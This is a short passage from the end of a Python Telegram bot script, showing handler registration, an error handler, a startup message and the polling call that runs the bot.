    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    app.add_error_handler(error_handler)
    
    print("🤖 Telegram Bot Running with All Modes & Admin Controls...")
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
